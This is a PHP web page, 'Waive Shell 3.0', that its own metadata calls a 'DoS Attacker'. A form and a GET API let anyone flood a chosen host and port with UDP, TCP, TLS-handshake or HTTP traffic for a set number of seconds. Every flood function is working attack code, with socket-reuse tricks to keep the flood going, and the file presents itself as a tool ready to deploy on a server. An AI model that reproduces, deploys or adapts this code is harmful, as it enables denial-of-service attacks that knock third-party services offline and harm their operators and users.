<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="WaiveShell3.0" content="DoS Attacker in PHP">
    <meta name="author" content="waived">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>:: Waive Shell ::</title>
    <style>
      body {
          font-family: 'Courier New', Courier, monospace; /* Arial, sans-serif; */
          background-color: white;
          color: black;
          margin: 0;
          padding: 0;   
      }
      h1 {
          font-family: Arial, sans-serif;
          text-align: center;
          color: black;
          text-shadow: 4px 4px 4px dimgray;
          font-weight: bold;
      }
      form {
          max-width: 300px;
          margin: 20px auto;
          background-color: gray;
          outline: 1px solid black;
          color: black;
          padding: 7px;
          box-shadow: 15px 15px 15px dimgray;
      }
      label {
          display: block;
          margin-bottom: 5px;
      }
      input[type="text"],
      input[type="number"],
      select {
          width: calc(100% - 12px);
          padding: 8px;
          margin-bottom: 10px;
          border: 1px solid black;
          /* border-radius: 4px; --- rounded edges */
          box-sizing: border-box;
          background-color: black;
          color: white;
      }
      button[type="submit"] {
          background-color: black;
          color: white;
          padding: 10px 20px;
          border: none;
          border-radius: 20px;
          cursor: pointer;
      }
      button[type="submit"]:hover {
          background-color: red;
          font-weight: bold;
      }
      footer {
          background-color: white;
          color: black;
          text-align: center;
          padding: 10px;
          position: fixed;
          bottom: 0;
          width: 100%;
      }
      *:focus {
          outline: none;
      }
    </style>
</head>
<body>
    <center>
    <h1 style="font-size: 45px;">WAIVE SHELL 3.0</h1>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="GET" id="dosForm">
        <label for="type"><b>TYPE</b></label>
        <select name="type" id="type">
            <option value="udp">UDP</option>
            <option value="tcp">TCP</option>
            <option value="tls">TLS</option>
            <option value="http">HTTP</option>
        </select><br>
        <label for="host"><b>HOST</b></label>
        <input type="text" name="host" id="host" required placeholder="1.1.1.1/www..." title="Target to slap"><br>
        <label for="port"><b>PORT</b></label>
        <input type="number" name="port" id="port" required placeholder="80" title="80:HTTP"><br>
        <label for="time"><b>SECONDS</b></label>
        <input type="number" name="time" id="time" required placeholder="300" title="Dont get crazy with this lol"><br>
        <button type="submit" onclick="launchDos()" title="I sincerely hope you know what this does...">---> LAUNCH <---</button>
    </form><br>
    <div id="statusMessage"></div>
    </center>

    <footer style="font-size: 12px;">
        API format:  <b>waiveshell.php?type=[udp/tcp/tls/http]&host=[ip/domain]&port=[1-65535]&time=[seconds]</b>
    </footer>

    <script>
        function launchDos() {
            var form = document.getElementById('dosForm');
            var type = form.elements['type'].value.toUpperCase();
            var host = form.elements['host'].value;
            var port = form.elements['port'].value;
            var time = form.elements['time'].value;

            var message = "ATTACKING " + host + ":" + port + " WITH " + type + " FOR " + time + " SECONDS";
            document.getElementById('statusMessage').innerText = message;
        }
    </script>

    <?php
    function _udp($ip, $port, $time) {
        $start_time = microtime(true);
        while ((microtime(true) - $start_time) < $time) {
            try {
                $data = random_bytes(mt_rand(1000, 1200));
                $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
                socket_sendto($socket, $data, strlen($data), 0, $ip, $port);
                socket_close($socket);
            } catch (Exception $e) {
                // echo "An error occurred: " . $e->getMessage();
            }
        }
        usleep(500000);
    }

    function _tls($host, $port, $time) {
        $start_time = microtime(true);
        while ((microtime(true) - $start_time) < $time) {
            try {
                // generate 4 random hex bytes for padding
                $bytes = random_bytes(4);
                $hexadecimal = bin2hex($bytes);
                $hex_with_prefix = '\x' . implode('\x', str_split($hexadecimal, 2));
            
                // manually code SSL-handshake 
                $data = "\x16\x03\x03$hex_with_prefix\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00";
                $socket = stream_socket_client($host . ':' . $port, $errno, $errstr, 30);
                
                // SSL wrap socket / hide warnings
                @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
                fwrite($socket, $data);
                
                // reuse to prevent TIME_WAIT local-socket exhaustion
                while ((microtime(true) - $start_time) < $time) {
                    $bytes = random_bytes(4);
                    $hexadecimal = bin2hex($bytes);
                    $hex_with_prefix = '\x' . implode('\x', str_split($hexadecimal, 2));
                    // reuse handshake w/ different padding values
                    $data = "\x16\x03\x03$hex_with_prefix\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00";
                    fwrite($socket, $data);
                }

                fclose($socket);
            } catch (Exception $e) {
                // echo "An error occurred: " . $e->getMessage();
            }
        }
        usleep(500000);
    }
    
    function _tcp($ip, $port, $time) {
        $start_time = microtime(true);
        while ((microtime(true) - $start_time) < $time) {
            try {
                $data = random_bytes(mt_rand(1000, 1200));
                $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                socket_connect($socket, $ip, $port);
                socket_write($socket, $data, strlen($data));
                // reuse to prevent TIME_WAIT local-socket exhaustion
                while ((microtime(true) - $start_time) < $time) {
                    // generate new data buffer
                    $data = random_bytes(mt_rand(1000, 1200));
                    socket_write($socket, $data, strlen($data));
                }
                socket_close($socket);
            } catch (Exception $e) {
                // echo "An error occurred: " . $e->getMessage();
            }
        }
        usleep(500000);
    }

    function _http($ip, $host, $port, $time) {
        $start_time = microtime(true);
        $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nUser-Agent: Mozilla/5.0\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=1000\r\n\r\n";
        while ((microtime(true) - $start_time) < $time) {
            try {
                $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                socket_connect($socket, $ip, $port);
                socket_write($socket, $data, strlen($data));
                // reuse to prevent TIME_WAIT local-socket exhaustion
                while ((microtime(true) - $start_time) < $time) {
                    socket_write($socket, $data, strlen($data));
                }
                socket_close($socket);
            } catch (Exception $e) {
                // echo "An error occurred: " . $e->getMessage();
            }
        }
        usleep(500000);
    }

    // API / input handling
    if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['type']) && isset($_GET['host']) && isset($_GET['port']) && isset($_GET['time'])) {
        // Retrieve parameters
        $type = $_GET['type'];
        $host = $_GET['host'];
        $port = $_GET['port'];
        $time = $_GET['time'];
        
        // DNS resolution
        $ip = gethostbyname($host);
        
        // ensure $port ranges from 1 to 65,535 / use http port
        if ($port < 1) {
            $port = 80;
        } elseif ($port > 65535) {
            $port = 80;
        }
        
        // ensure non-negative time specified for duration / if so, set 30sec duration
        if ($time < 1) {
            $time = 30;
        }
        
        if (strtolower($type) === 'udp') {
            _udp($ip, $port, $time);
        } elseif (strtolower($type) === 'tcp') {
            _tcp($ip, $port, $time);
        } elseif (strtolower($type) === 'tls') {
            _tls($host, $port, $time);
        } elseif (strtolower($type) === 'http') {
            _http($ip, $host, $port, $time);
        }
    } else {
        // display nothing
    }
    ?>
</body>
</html>
